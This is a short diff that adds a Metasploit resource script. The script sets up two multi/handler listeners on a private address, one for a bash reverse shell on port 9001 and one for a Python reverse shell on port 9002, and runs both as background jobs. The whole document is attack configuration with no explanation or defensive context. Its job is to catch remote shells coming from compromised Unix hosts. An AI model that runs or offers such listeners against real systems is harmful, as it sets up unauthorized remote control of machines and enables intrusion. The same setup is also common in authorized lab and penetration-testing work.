@@ -1,0 +1,11 @@
+use exploit/multi/handler
+set PAYLOAD cmd/unix/reverse_bash
+set lhost 192.168.33.12
+set lport 9001 
+run -j
+
+use exploit/multi/handler
+set PAYLOAD cmd/unix/reverse_python 
+set lhost 192.168.33.12
+set lport 9002
+run -j
